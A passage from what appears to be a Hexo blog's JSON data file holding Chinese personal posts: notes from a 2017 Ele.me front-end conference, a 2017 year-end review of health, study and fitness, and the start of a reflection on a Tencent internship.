心得\n在这次前端开发者大会上，确实有很多收获，从打开一扇新技术的大门，到很多新型技术上的接触。从一些排斥，到一些闪光点的发觉。慢慢发现还有很多事情应该去深究的。当然这是技术上的发觉。还有是在上海这个地方，或者说人生观的觉悟。上海这个地方是一个神奇的地方，他是金融中心，也是很多人的发源地。可以有很多机会让你一夜暴富。但是相同的，他太多的泡沫。很多人都是很疲惫的生活着，没有自己的梦想，在一个大城市的打磨之下，变成了这个大城市运作的一个个小零件。对这件事情之上，有很深的体会。路上的人看起来没有那么慈眉善目，也没有很多的暖，只是冷冷的互相看着手机。可能我是不适合上海这个城市吧。对于这种束缚力过强的地方，不如在小城市来的实在。\n\n#### 感谢\n此次饿了么活动是子健学长和成成学长两个人推荐去的。在去的途中，子健学长和成成学长对我们非常照顾，不仅定房间和吃饭问题，在此次大会上也交流了许多技术，学到了很多。女神也对我们十分照顾，请我们大吃一顿，聊了很久，对于上海这个城市有了新的认识。在此次饿了么之旅发现了许多新技术，以及之前没有涉及到的领域，也从各个大牛手上获取了一手的咨询。不论是对自己，还是对家园，都有了新的认识，新的期许。","slug":"2017-ele-Interecommunions","published":1,"updated":"2021-09-11T05:06:08.719Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nyzs00014jzxgmaxnbw1","content":"<h4 id=\"几个演讲\"><a href=\"#几个演讲\" class=\"headerlink\" title=\"几个演讲\"></a>几个演讲</h4><p>从h5的埋雷到ServerLess，确实有很多收获。<br>从h5里面，不仅得到了关于页面优化的一些方案，也触及到了一些解决方案。发现h5有很多东西值得深究，有页面调试的一些优化等等。例如：从sticky到z-index实在有太多的学问了。而在工具方面，发现chrome的调试工具是在是太强大了，以前一直没有用过的memery和apperance等等，都有了新的认识。发现页面优化不仅仅是想象的那么简单。从小东西上入手，发现有很多的学问。是在是可以多学。层的探讨、强制同步布局、visibility、￥和&amp;yen,以及dom的一步步呈现。感觉自己学的尚浅，有许多东西可以去学习。<br>从第三方服务上也学到许多，vue的地图篇，地图的实现以及地图api的调用以及api的设计，等等。对vue的深度似乎多了那么一些，总感觉自己学的东西都特别浅，没有能直接做的，对这一块还是得加深学习。<br>当然还有页面编辑可视化的一些小理解。可以通过直接编译组建，上传到服务器，然后服务器直接加到代码中，就可以不用cv代码，直接到里面去修改了。页面编辑其实就将页面上的东西图片生成一个json，让后到服务器中再呈现。而各个小组件是直接编译也好或者源代码也好，上传到服务器后，服务器上有一个gulp或者webpack，直接将其打包，编译，出现页面。这样就可以直接在本地做小组件，然后上传到服务器，服务器直接将其打包之后，就可以直接生成新的页面了。<br>还有用户体验。在用户体验上，发现确实有很多东西需要去深入。比如用户体验的的最终目的，用户体验的原始需求，去发觉里面的各个种种原始目的、需求去解决问题。这样能快速的从用户的角度去看事情的原委。当然，这个产品针对人群也要去探讨，是不是要更改是从目的人群去发掘的。<br>再就是vue和typescript。之前一直不愿意去接触typescript，很大的一个原因是因为自己喜欢原生的东西，喜欢纯粹的东西，所以不愿意，或者说去排斥typescript。这次无疑是打开了我对typescript的一扇门，因为typescript确实设计的很好，一些东西确实可以去深究。而typescript和vue也开始慢慢融合了，在vue的2.5版本里面是typescript的一个上升期，vue对typescript的支持，也可以更优雅的写vue了。所以对typescript也没有了之前的排斥，而是对它开始慢慢接受了。<br>最后的东西就是serverless，serverless是一个很强的东西，虽然我之前没有了解过，唯一了解是通过这次开发者大会上。但是serverless从前辈的介绍上，他确实可以减少很多运维和后端的一些成本，从而快速开发。现在这个时代就是一个快速开发的时代，所以对serverless的前景，肯定是光明的。所以开始使用serverless是一个不错的选择。<br><img src=\"/img/loading.gif\" data-original=\"/随笔/2017-ele-Interecommunions/eleTalking.jpg\" alt=\"ele-taking\"></p><h4 id=\"心得\"><a href=\"#心得\" class=\"headerlink\" title=\"心得\"></a>心得</h4><p>在这次前端开发者大会上，确实有很多收获，从打开一扇新技术的大门，到很多新型技术上的接触。从一些排斥，到一些闪光点的发觉。慢慢发现还有很多事情应该去深究的。当然这是技术上的发觉。还有是在上海这个地方，或者说人生观的觉悟。上海这个地方是一个神奇的地方，他是金融中心，也是很多人的发源地。可以有很多机会让你一夜暴富。但是相同的，他太多的泡沫。很多人都是很疲惫的生活着，没有自己的梦想，在一个大城市的打磨之下，变成了这个大城市运作的一个个小零件。对这件事情之上，有很深的体会。路上的人看起来没有那么慈眉善目，也没有很多的暖，只是冷冷的互相看着手机。可能我是不适合上海这个城市吧。对于这种束缚力过强的地方，不如在小城市来的实在。</p><h4 id=\"感谢\"><a href=\"#感谢\" class=\"headerlink\" title=\"感谢\"></a>感谢</h4><p>此次饿了么活动是子健学长和成成学长两个人推荐去的。在去的途中，子健学长和成成学长对我们非常照顾，不仅定房间和吃饭问题，在此次大会上也交流了许多技术，学到了很多。女神也对我们十分照顾，请我们大吃一顿，聊了很久，对于上海这个城市有了新的认识。在此次饿了么之旅发现了许多新技术，以及之前没有涉及到的领域，也从各个大牛手上获取了一手的咨询。不论是对自己，还是对家园，都有了新的认识，新的期许。</p>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"几个演讲\"><a href=\"#几个演讲\" class=\"headerlink\" title=\"几个演讲\"></a>几个演讲</h4><p>从h5的埋雷到ServerLess，确实有很多收获。<br>从h5里面，不仅得到了关于页面优化的一些方案，也触及到了一些解决方案。发现h5有很多东西值得深究，有页面调试的一些优化等等。例如：从sticky到z-index实在有太多的学问了。而在工具方面，发现chrome的调试工具是在是太强大了，以前一直没有用过的memery和apperance等等，都有了新的认识。发现页面优化不仅仅是想象的那么简单。从小东西上入手，发现有很多的学问。是在是可以多学。层的探讨、强制同步布局、visibility、￥和&amp;yen,以及dom的一步步呈现。感觉自己学的尚浅，有许多东西可以去学习。<br>从第三方服务上也学到许多，vue的地图篇，地图的实现以及地图api的调用以及api的设计，等等。对vue的深度似乎多了那么一些，总感觉自己学的东西都特别浅，没有能直接做的，对这一块还是得加深学习。<br>当然还有页面编辑可视化的一些小理解。可以通过直接编译组建，上传到服务器，然后服务器直接加到代码中，就可以不用cv代码，直接到里面去修改了。页面编辑其实就将页面上的东西图片生成一个json，让后到服务器中再呈现。而各个小组件是直接编译也好或者源代码也好，上传到服务器后，服务器上有一个gulp或者webpack，直接将其打包，编译，出现页面。这样就可以直接在本地做小组件，然后上传到服务器，服务器直接将其打包之后，就可以直接生成新的页面了。<br>还有用户体验。在用户体验上，发现确实有很多东西需要去深入。比如用户体验的的最终目的，用户体验的原始需求，去发觉里面的各个种种原始目的、需求去解决问题。这样能快速的从用户的角度去看事情的原委。当然，这个产品针对人群也要去探讨，是不是要更改是从目的人群去发掘的。<br>再就是vue和typescript。之前一直不愿意去接触typescript，很大的一个原因是因为自己喜欢原生的东西，喜欢纯粹的东西，所以不愿意，或者说去排斥typescript。这次无疑是打开了我对typescript的一扇门，因为typescript确实设计的很好，一些东西确实可以去深究。而typescript和vue也开始慢慢融合了，在vue的2.5版本里面是typescript的一个上升期，vue对typescript的支持，也可以更优雅的写vue了。所以对typescript也没有了之前的排斥，而是对它开始慢慢接受了。<br>最后的东西就是serverless，serverless是一个很强的东西，虽然我之前没有了解过，唯一了解是通过这次开发者大会上。但是serverless从前辈的介绍上，他确实可以减少很多运维和后端的一些成本，从而快速开发。现在这个时代就是一个快速开发的时代，所以对serverless的前景，肯定是光明的。所以开始使用serverless是一个不错的选择。<br><img src=\"/随笔/2017-ele-Interecommunions/eleTalking.jpg\" alt=\"ele-taking\"></p><h4 id=\"心得\"><a href=\"#心得\" class=\"headerlink\" title=\"心得\"></a>心得</h4><p>在这次前端开发者大会上，确实有很多收获，从打开一扇新技术的大门，到很多新型技术上的接触。从一些排斥，到一些闪光点的发觉。慢慢发现还有很多事情应该去深究的。当然这是技术上的发觉。还有是在上海这个地方，或者说人生观的觉悟。上海这个地方是一个神奇的地方，他是金融中心，也是很多人的发源地。可以有很多机会让你一夜暴富。但是相同的，他太多的泡沫。很多人都是很疲惫的生活着，没有自己的梦想，在一个大城市的打磨之下，变成了这个大城市运作的一个个小零件。对这件事情之上，有很深的体会。路上的人看起来没有那么慈眉善目，也没有很多的暖，只是冷冷的互相看着手机。可能我是不适合上海这个城市吧。对于这种束缚力过强的地方，不如在小城市来的实在。</p><h4 id=\"感谢\"><a href=\"#感谢\" class=\"headerlink\" title=\"感谢\"></a>感谢</h4><p>此次饿了么活动是子健学长和成成学长两个人推荐去的。在去的途中，子健学长和成成学长对我们非常照顾，不仅定房间和吃饭问题，在此次大会上也交流了许多技术，学到了很多。女神也对我们十分照顾，请我们大吃一顿，聊了很久，对于上海这个城市有了新的认识。在此次饿了么之旅发现了许多新技术，以及之前没有涉及到的领域，也从各个大牛手上获取了一手的咨询。不论是对自己，还是对家园，都有了新的认识，新的期许。</p>"},{"title":"2017总结","date":"2017-12-31T13:50:47.000Z","dir":"随笔","_content":"2017年，应该是我过的最艰苦的一年了。\n2017年，也是学东西学的最多的一年。\n2017年，也是身材变化最大的一年了。\n\n病痛时间线\n回顾2017年一整年。\n\n2月底在家里穿鞋不小心扭伤腰\n3月底在学校健身做俄罗斯转体拉伤筋膜\n4月底实在忍受不了疼痛，回家修养了半个月\n6月初发现自己精索静脉曲张\n6月底去医院做了手术\n7月份带病去工作室工作了一个月，去的那一天，还是一瘸以拐\n11月底发现自己的腹股沟疼痛\n12月底腰上，腹股沟疼痛难忍，最终去针灸治疗\n想想还是很佩服我自己的20岁。在这个一整年中，几乎都是与病痛做斗争。看看自己的身体状况，精索静脉曲张是因为遗传行疾病，而腹股沟疼痛是因为筋缩，也就是因为寒冷，因为肝和肾没有和睾丸相通，所以导致疼痛。而腰上则是因为高考过多的劳累，休息不够，每天都因为学习，导致腰部腰肌劳损。\n在回顾自己的这些个病痛史，发现自己还是很坚强。在面对病痛还是坚持学习，坚持带新生。虽然自己很倒霉，病痛是不经意间来到自己的身上，但是自己的表现还是可以给90分的。\n加油！\n学习时间线\n回顾整个学习线\n年初，看过一边编译与反编译。\n大二下学期，在陈悦老师操作系统基础一课自认学的还不错。\n大二下学期做一个微信小程序参加比赛，虽然没拿到奖，但是对小程序有了一定程度上的了解！\n大二暑期获得一个环保主题的小奖。\n大二暑假实训，一个月学了很多东西，重新拜读了一遍javascript高级教程，感觉学习颇多，再做了不少云家园的应用。对vue又重新有了新的认识。\n大二暑期，对es6重新读了一遍，对js又有了新的认识。并且读了一边你不知道的js，收获颇多。\n大三上，学校开课mfc和qt5,做了一个小应用，但是并不是很精细。\n大三上，学校开课mssqlserver，对数据库的一些操作又有了新的认识。并且觉得操作系统和sqlserver中比如锁有这亲密的关系。\n大三上，学校开课java，学习了java，并且用spring boot做了一个应用后端，感觉收获还是颇多。\n大三上，学校开课计算机网络，对计算机网络和visual c++网络编程。\n大三上，使用nodejs+mongodb开发了一个gpa热点，对mongodb和node的使用和构造有了一定的了解。\n大三上，本来想用react 开发项目，只是写了demo就结束了\n回顾整个2017年的学习路线，学习的不少，也自己安装了一个archlinux，对操作系统和linux操作系统有了新的认识。自己的一些技术栈的扩展，有了一定的提升，对于js这门语言，有了许多全新的认识，js与java结合，感觉有很多新的火花磨出来。记得6月28号手术那一天，为了赶一个比赛，第二天就开始躺在床上写代码，现在想起来不仅感慨。真心感觉当时很帅！为自己的毅力打99分。真的！这一年，我觉得自己最帅的一天，就是29号赶代码。自己还喝着稀饭，身子还不敢转动，自己还坚持写代码。这一年，自己真心经历了不少。\n番外篇：\n2017年还学习了一些其他的东西\n开始学习了护肤。真心觉得可以遇见更好的自己。\n和老爹一起完成了自己家的花园。\n学习了蔡康永的说话之道一书，自己也规定每周三联系一位很久没有联系的朋友。\n去上海和牡丹江旅游了一波，看到了不一样的地方，体验了不一样的开发者社区。\n学了不少的穿搭，对颜色和穿搭有了一定的见解。\n开始喝牛奶。\n身材\n回顾身材的改变\n从过年的118到年后的122。假期的一些徒手健身，发现自己的公狗腰有了一定的变化。\n到学校后健身，买了一个哑铃。身材保持在120。直到扭伤腰后一直停止健身到7月底。\n手术后120,工作室第一个月，从120变成127,开始健身。127是健子肉。\n暑期后是128,然后办了一张健身卡，体重到最近停止健身是132。\n可能最近长了一些肉，体重到138左右，但是体脂率保持在18以下。\n可以看到，从年前的118到现在的138,体重增长了20,身材也改变了不少。自手术后，吃好喝好。身材有了极大的变化。当然，我的目标是150到160。这一年不仅仅是肌肉的变化，其实可以很明显的发觉，健身的知识也增加了，并且改变了不少。学习了很多健身方面的知识。\n总结：新的一年，学习了不少的东西，也做了很多东西。自己的改变是可以肉眼所见的。当然，也可能因为过于拼，所以身上有很多病症。当然，这一年的毅力也有了不小的提升。谢谢2017年的自己。虽然很累，但是很开心！\n2018期望:希望2018年能学到更多，能进自己希望的大厂。学习到更多前沿的技术。父母亲人身体健康。自己爱的人和爱自己的人能够快快乐乐的生活！","source":"_posts/2017-summery.md","raw":"---\ntitle: 2017总结\ndate: 2017-12-31 21:50:47\ntags: 随笔\ndir: 随笔\n---\n2017年，应该是我过的最艰苦的一年了。\n2017年，也是学东西学的最多的一年。\n2017年，也是身材变化最大的一年了。\n\n病痛时间线\n回顾2017年一整年。\n\n2月底在家里穿鞋不小心扭伤腰\n3月底在学校健身做俄罗斯转体拉伤筋膜\n4月底实在忍受不了疼痛，回家修养了半个月\n6月初发现自己精索静脉曲张\n6月底去医院做了手术\n7月份带病去工作室工作了一个月，去的那一天，还是一瘸以拐\n11月底发现自己的腹股沟疼痛\n12月底腰上，腹股沟疼痛难忍，最终去针灸治疗\n想想还是很佩服我自己的20岁。在这个一整年中，几乎都是与病痛做斗争。看看自己的身体状况，精索静脉曲张是因为遗传行疾病，而腹股沟疼痛是因为筋缩，也就是因为寒冷，因为肝和肾没有和睾丸相通，所以导致疼痛。而腰上则是因为高考过多的劳累，休息不够，每天都因为学习，导致腰部腰肌劳损。\n在回顾自己的这些个病痛史，发现自己还是很坚强。在面对病痛还是坚持学习，坚持带新生。虽然自己很倒霉，病痛是不经意间来到自己的身上，但是自己的表现还是可以给90分的。\n加油！\n学习时间线\n回顾整个学习线\n年初，看过一边编译与反编译。\n大二下学期，在陈悦老师操作系统基础一课自认学的还不错。\n大二下学期做一个微信小程序参加比赛，虽然没拿到奖，但是对小程序有了一定程度上的了解！\n大二暑期获得一个环保主题的小奖。\n大二暑假实训，一个月学了很多东西，重新拜读了一遍javascript高级教程，感觉学习颇多，再做了不少云家园的应用。对vue又重新有了新的认识。\n大二暑期，对es6重新读了一遍，对js又有了新的认识。并且读了一边你不知道的js，收获颇多。\n大三上，学校开课mfc和qt5,做了一个小应用，但是并不是很精细。\n大三上，学校开课mssqlserver，对数据库的一些操作又有了新的认识。并且觉得操作系统和sqlserver中比如锁有这亲密的关系。\n大三上，学校开课java，学习了java，并且用spring boot做了一个应用后端，感觉收获还是颇多。\n大三上，学校开课计算机网络，对计算机网络和visual c++网络编程。\n大三上，使用nodejs+mongodb开发了一个gpa热点，对mongodb和node的使用和构造有了一定的了解。\n大三上，本来想用react 开发项目，只是写了demo就结束了\n回顾整个2017年的学习路线，学习的不少，也自己安装了一个archlinux，对操作系统和linux操作系统有了新的认识。自己的一些技术栈的扩展，有了一定的提升，对于js这门语言，有了许多全新的认识，js与java结合，感觉有很多新的火花磨出来。记得6月28号手术那一天，为了赶一个比赛，第二天就开始躺在床上写代码，现在想起来不仅感慨。真心感觉当时很帅！为自己的毅力打99分。真的！这一年，我觉得自己最帅的一天，就是29号赶代码。自己还喝着稀饭，身子还不敢转动，自己还坚持写代码。这一年，自己真心经历了不少。\n番外篇：\n2017年还学习了一些其他的东西\n开始学习了护肤。真心觉得可以遇见更好的自己。\n和老爹一起完成了自己家的花园。\n学习了蔡康永的说话之道一书，自己也规定每周三联系一位很久没有联系的朋友。\n去上海和牡丹江旅游了一波，看到了不一样的地方，体验了不一样的开发者社区。\n学了不少的穿搭，对颜色和穿搭有了一定的见解。\n开始喝牛奶。\n身材\n回顾身材的改变\n从过年的118到年后的122。假期的一些徒手健身，发现自己的公狗腰有了一定的变化。\n到学校后健身，买了一个哑铃。身材保持在120。直到扭伤腰后一直停止健身到7月底。\n手术后120,工作室第一个月，从120变成127,开始健身。127是健子肉。\n暑期后是128,然后办了一张健身卡，体重到最近停止健身是132。\n可能最近长了一些肉，体重到138左右，但是体脂率保持在18以下。\n可以看到，从年前的118到现在的138,体重增长了20,身材也改变了不少。自手术后，吃好喝好。身材有了极大的变化。当然，我的目标是150到160。这一年不仅仅是肌肉的变化，其实可以很明显的发觉，健身的知识也增加了，并且改变了不少。学习了很多健身方面的知识。\n总结：新的一年，学习了不少的东西，也做了很多东西。自己的改变是可以肉眼所见的。当然，也可能因为过于拼，所以身上有很多病症。当然，这一年的毅力也有了不小的提升。谢谢2017年的自己。虽然很累，但是很开心！\n2018期望:希望2018年能学到更多，能进自己希望的大厂。学习到更多前沿的技术。父母亲人身体健康。自己爱的人和爱自己的人能够快快乐乐的生活！","slug":"2017-summery","published":1,"updated":"2021-09-11T04:59:21.796Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nyzu00024jzxjebdrytf","content":"<p>2017年，应该是我过的最艰苦的一年了。<br>2017年，也是学东西学的最多的一年。<br>2017年，也是身材变化最大的一年了。</p><p>病痛时间线<br>回顾2017年一整年。</p><p>2月底在家里穿鞋不小心扭伤腰<br>3月底在学校健身做俄罗斯转体拉伤筋膜<br>4月底实在忍受不了疼痛，回家修养了半个月<br>6月初发现自己精索静脉曲张<br>6月底去医院做了手术<br>7月份带病去工作室工作了一个月，去的那一天，还是一瘸以拐<br>11月底发现自己的腹股沟疼痛<br>12月底腰上，腹股沟疼痛难忍，最终去针灸治疗<br>想想还是很佩服我自己的20岁。在这个一整年中，几乎都是与病痛做斗争。看看自己的身体状况，精索静脉曲张是因为遗传行疾病，而腹股沟疼痛是因为筋缩，也就是因为寒冷，因为肝和肾没有和睾丸相通，所以导致疼痛。而腰上则是因为高考过多的劳累，休息不够，每天都因为学习，导致腰部腰肌劳损。<br>在回顾自己的这些个病痛史，发现自己还是很坚强。在面对病痛还是坚持学习，坚持带新生。虽然自己很倒霉，病痛是不经意间来到自己的身上，但是自己的表现还是可以给90分的。<br>加油！<br>学习时间线<br>回顾整个学习线<br>年初，看过一边编译与反编译。<br>大二下学期，在陈悦老师操作系统基础一课自认学的还不错。<br>大二下学期做一个微信小程序参加比赛，虽然没拿到奖，但是对小程序有了一定程度上的了解！<br>大二暑期获得一个环保主题的小奖。<br>大二暑假实训，一个月学了很多东西，重新拜读了一遍javascript高级教程，感觉学习颇多，再做了不少云家园的应用。对vue又重新有了新的认识。<br>大二暑期，对es6重新读了一遍，对js又有了新的认识。并且读了一边你不知道的js，收获颇多。<br>大三上，学校开课mfc和qt5,做了一个小应用，但是并不是很精细。<br>大三上，学校开课mssqlserver，对数据库的一些操作又有了新的认识。并且觉得操作系统和sqlserver中比如锁有这亲密的关系。<br>大三上，学校开课java，学习了java，并且用spring boot做了一个应用后端，感觉收获还是颇多。<br>大三上，学校开课计算机网络，对计算机网络和visual c++网络编程。<br>大三上，使用nodejs+mongodb开发了一个gpa热点，对mongodb和node的使用和构造有了一定的了解。<br>大三上，本来想用react 开发项目，只是写了demo就结束了<br>回顾整个2017年的学习路线，学习的不少，也自己安装了一个archlinux，对操作系统和linux操作系统有了新的认识。自己的一些技术栈的扩展，有了一定的提升，对于js这门语言，有了许多全新的认识，js与java结合，感觉有很多新的火花磨出来。记得6月28号手术那一天，为了赶一个比赛，第二天就开始躺在床上写代码，现在想起来不仅感慨。真心感觉当时很帅！为自己的毅力打99分。真的！这一年，我觉得自己最帅的一天，就是29号赶代码。自己还喝着稀饭，身子还不敢转动，自己还坚持写代码。这一年，自己真心经历了不少。<br>番外篇：<br>2017年还学习了一些其他的东西<br>开始学习了护肤。真心觉得可以遇见更好的自己。<br>和老爹一起完成了自己家的花园。<br>学习了蔡康永的说话之道一书，自己也规定每周三联系一位很久没有联系的朋友。<br>去上海和牡丹江旅游了一波，看到了不一样的地方，体验了不一样的开发者社区。<br>学了不少的穿搭，对颜色和穿搭有了一定的见解。<br>开始喝牛奶。<br>身材<br>回顾身材的改变<br>从过年的118到年后的122。假期的一些徒手健身，发现自己的公狗腰有了一定的变化。<br>到学校后健身，买了一个哑铃。身材保持在120。直到扭伤腰后一直停止健身到7月底。<br>手术后120,工作室第一个月，从120变成127,开始健身。127是健子肉。<br>暑期后是128,然后办了一张健身卡，体重到最近停止健身是132。<br>可能最近长了一些肉，体重到138左右，但是体脂率保持在18以下。<br>可以看到，从年前的118到现在的138,体重增长了20,身材也改变了不少。自手术后，吃好喝好。身材有了极大的变化。当然，我的目标是150到160。这一年不仅仅是肌肉的变化，其实可以很明显的发觉，健身的知识也增加了，并且改变了不少。学习了很多健身方面的知识。<br>总结：新的一年，学习了不少的东西，也做了很多东西。自己的改变是可以肉眼所见的。当然，也可能因为过于拼，所以身上有很多病症。当然，这一年的毅力也有了不小的提升。谢谢2017年的自己。虽然很累，但是很开心！<br>2018期望:希望2018年能学到更多，能进自己希望的大厂。学习到更多前沿的技术。父母亲人身体健康。自己爱的人和爱自己的人能够快快乐乐的生活！</p>","site":{"data":{}},"excerpt":"","more":"<p>2017年，应该是我过的最艰苦的一年了。<br>2017年，也是学东西学的最多的一年。<br>2017年，也是身材变化最大的一年了。</p><p>病痛时间线<br>回顾2017年一整年。</p><p>2月底在家里穿鞋不小心扭伤腰<br>3月底在学校健身做俄罗斯转体拉伤筋膜<br>4月底实在忍受不了疼痛，回家修养了半个月<br>6月初发现自己精索静脉曲张<br>6月底去医院做了手术<br>7月份带病去工作室工作了一个月，去的那一天，还是一瘸以拐<br>11月底发现自己的腹股沟疼痛<br>12月底腰上，腹股沟疼痛难忍，最终去针灸治疗<br>想想还是很佩服我自己的20岁。在这个一整年中，几乎都是与病痛做斗争。看看自己的身体状况，精索静脉曲张是因为遗传行疾病，而腹股沟疼痛是因为筋缩，也就是因为寒冷，因为肝和肾没有和睾丸相通，所以导致疼痛。而腰上则是因为高考过多的劳累，休息不够，每天都因为学习，导致腰部腰肌劳损。<br>在回顾自己的这些个病痛史，发现自己还是很坚强。在面对病痛还是坚持学习，坚持带新生。虽然自己很倒霉，病痛是不经意间来到自己的身上，但是自己的表现还是可以给90分的。<br>加油！<br>学习时间线<br>回顾整个学习线<br>年初，看过一边编译与反编译。<br>大二下学期，在陈悦老师操作系统基础一课自认学的还不错。<br>大二下学期做一个微信小程序参加比赛，虽然没拿到奖，但是对小程序有了一定程度上的了解！<br>大二暑期获得一个环保主题的小奖。<br>大二暑假实训，一个月学了很多东西，重新拜读了一遍javascript高级教程，感觉学习颇多，再做了不少云家园的应用。对vue又重新有了新的认识。<br>大二暑期，对es6重新读了一遍，对js又有了新的认识。并且读了一边你不知道的js，收获颇多。<br>大三上，学校开课mfc和qt5,做了一个小应用，但是并不是很精细。<br>大三上，学校开课mssqlserver，对数据库的一些操作又有了新的认识。并且觉得操作系统和sqlserver中比如锁有这亲密的关系。<br>大三上，学校开课java，学习了java，并且用spring boot做了一个应用后端，感觉收获还是颇多。<br>大三上，学校开课计算机网络，对计算机网络和visual c++网络编程。<br>大三上，使用nodejs+mongodb开发了一个gpa热点，对mongodb和node的使用和构造有了一定的了解。<br>大三上，本来想用react 开发项目，只是写了demo就结束了<br>回顾整个2017年的学习路线，学习的不少，也自己安装了一个archlinux，对操作系统和linux操作系统有了新的认识。自己的一些技术栈的扩展，有了一定的提升，对于js这门语言，有了许多全新的认识，js与java结合，感觉有很多新的火花磨出来。记得6月28号手术那一天，为了赶一个比赛，第二天就开始躺在床上写代码，现在想起来不仅感慨。真心感觉当时很帅！为自己的毅力打99分。真的！这一年，我觉得自己最帅的一天，就是29号赶代码。自己还喝着稀饭，身子还不敢转动，自己还坚持写代码。这一年，自己真心经历了不少。<br>番外篇：<br>2017年还学习了一些其他的东西<br>开始学习了护肤。真心觉得可以遇见更好的自己。<br>和老爹一起完成了自己家的花园。<br>学习了蔡康永的说话之道一书，自己也规定每周三联系一位很久没有联系的朋友。<br>去上海和牡丹江旅游了一波，看到了不一样的地方，体验了不一样的开发者社区。<br>学了不少的穿搭，对颜色和穿搭有了一定的见解。<br>开始喝牛奶。<br>身材<br>回顾身材的改变<br>从过年的118到年后的122。假期的一些徒手健身，发现自己的公狗腰有了一定的变化。<br>到学校后健身，买了一个哑铃。身材保持在120。直到扭伤腰后一直停止健身到7月底。<br>手术后120,工作室第一个月，从120变成127,开始健身。127是健子肉。<br>暑期后是128,然后办了一张健身卡，体重到最近停止健身是132。<br>可能最近长了一些肉，体重到138左右，但是体脂率保持在18以下。<br>可以看到，从年前的118到现在的138,体重增长了20,身材也改变了不少。自手术后，吃好喝好。身材有了极大的变化。当然，我的目标是150到160。这一年不仅仅是肌肉的变化，其实可以很明显的发觉，健身的知识也增加了，并且改变了不少。学习了很多健身方面的知识。<br>总结：新的一年，学习了不少的东西，也做了很多东西。自己的改变是可以肉眼所见的。当然，也可能因为过于拼，所以身上有很多病症。当然，这一年的毅力也有了不小的提升。谢谢2017年的自己。虽然很累，但是很开心！<br>2018期望:希望2018年能学到更多，能进自己希望的大厂。学习到更多前沿的技术。父母亲人身体健康。自己爱的人和爱自己的人能够快快乐乐的生活！</p>"},{"title":"腾讯三个月实习有感","date":"2018-09-06T02:56:12.000Z","dir":"随笔","_content":"\n时间过得真快，8月31号离职，转眼一星期过去了...\n\n心情也沉淀了一些，将自己的一些感受记录下来吧～\n\n\n\n于今年三月底勉强的拿到了腾讯的船票，上了这条大船，有幸认识腾讯，接触腾讯和喜欢腾讯。\n\n于今年五月十九日加入腾讯，开始窥斑见豹之旅。\n\n### 初见腾讯\n\n和大多数实习生一样，一同去滨海大厦办理入职。\n\n下了公车，在不知所措中猛然发现，原来附近高楼大厦中有一个格外显眼的大楼，便是腾讯滨海大厦了。\n\n一切都似乎在计划中执行，从签合同到办理证件，从结交朋友到一同入住酒店。似乎是一套标准流程，让人感觉安全和亲切。\n\n见过滨海后，公司又安排了内部培训。大家讨论方案，脑暴产品，学习借鉴，最终2周后也交上了一份满意的答卷，获得了金奖的好成绩～\n\n当然，要问我映像最深刻的是什么，要我说，一定是结交朋友了。\n\n初见腾讯，因为学校原因，自己比较自卑。因为身旁好学校的大把，而自己只是一个末流211。可是大家似乎也不问出身，都很和蔼可亲，让人舒服和信赖，在这里也结交了许多朋友，让我打开新世界的大门。\n\n### 在腾讯生活\n\n##### 在腾讯生活是孤独的\n\n似乎大家每天都在忙，未曾见过闲人；如果有，便是自己吧。大家似乎都在面对着电脑工作，自己偶尔有休息的时候，只能闲下来玩玩手机，或是逛逛内部贴吧，以迎接下一个需求。\n\n##### 在腾讯生活是自在的\n\n在这里没有上班打卡的束缚，不需要早上8，9点必须到，若是自己有需要处理的事情，只需要和leader知会一声即可；没有上班工作服装的要求，可以穿着拖鞋，穿着背心（只要不怕空调冷）头发蓬蓬的来上班都行。\n\n每天8点半起床，洗漱后去公司吃早餐；下雨天穿拖鞋，即使鞋子湿了，也可以烘干；有时间就去健身，只需要下一层楼即是健身房的我，体重在3个月不变的情况下，体脂从16%到了10%。\n\n### 在腾讯学习\n\n虽然是web前端实习生，但是学习和开拓了不少眼界！\n\n##### 在腾讯学习机制下\n\n腾讯有很棒的内部资源，无论是腾讯学院，还是腾讯大学，还是面授课。都有很棒的学习资源。\n\n而我几乎每天都会花一部分时间听一听这些课程，不为学习精通，是想了解一下这个世界，这些大牛学习了哪些课程，研究了什么方向，到达了什么程度。顺便提升自己，编写代码过程中有哪些需要注意的；有哪些比较好提升效率的工具；学习方向或是整个大方向的运作。在为期3个月的积累上，确实对行业有了新的认知！\n\n##### 在周围同学中学习\n\n在这里最感谢四个人了。\n\n* 导师: 我是一个不爱表达的人，而她很会发现人的情绪波动，和导师畅聊一番后，度过了一段艰苦的日子；在专业方面，学到如何把一个点考虑的完整，如何把一段代码写的更好，还有对项目更深层次的认识；在生活方面，不论是一些小零食，周末加班福利，还是工作烦心后请客吃饭，都让初到公司的我感到许许多多温暖。\n\n* leader: 非常自豪地说，我有一个非常棒的leader！不论是专业知识，还是整个团队的氛围，都是非常棒！从每天开会的全局把控，到每个小点的细致分工；从团队的迭代速度，到团队技术提升；从团队文化建设，到每个人心态变化…做的非常棒，也在leader身上学到了很多处事原则。学到了心态，责任大于能力！\n\n* Roger: 如果说在导师身上学到的代码和诚以待人，leader身上学到职业素养和责任义务，那么在Roger身上学到的是为人处事的能力了，这似乎是一个非常虚的词，但是对我帮助却很大。初上职场难免会有一些不适应，不像学校里做的好不好无所谓；而是工作上精益求精，要让别人信赖你，敢放心把事情交给你做。对我处事有了非常大的帮助！\n\n* 聪哥: 前三年的健身经验似乎都被这个暑假打败了，缺少健身教练瞎练，虽然有一些成就，但是发力不对导致身材变形，动作不标准导致事倍功半。而这一个暑假无疑是打破之前所有不标准的开始。也让我从饮食结构上改变，从最初的体脂率16%到现在的10%，而体重几乎没有变化！十分感谢聪哥的帮助！\n\n### 思考的转变\n\n##### 对职业的思考\n\n程序员的代码能力，到了一定的程度似乎都大同小异，最终决定高度的，一定是代码能力相关的其他能力高度及职业素养的高度。\n\n* 程序员职业素养:   发生问题及时解决，对问题本身去深入探究，面对新东西不畏惧，对所在领域的持续学习......\n\n* 要么不做，要么做好的态度：出自自己手的东西一定要做好，一开始上手时难免踩了不少坑，走了不少弯路，写了不少bug，既然选择要把需求做完，那一定要做好，这一版本下一版本都需要去考虑，虽然当前版本不上该功能，一定要留有接口\n\n* 其他能力: 比如对编译器的理解，对内核的理解，对cpu的理解......\n\n     _这可能是许许多多的知识组合而成。例如：发生任何问题及代码如何调优，知道如何去优化和找到最佳方案；整个项目的架构及编码，知道这个项目使用什么方式去做是最佳选择；对外时完善内部接口，对内时贴好文档._\n\n##### 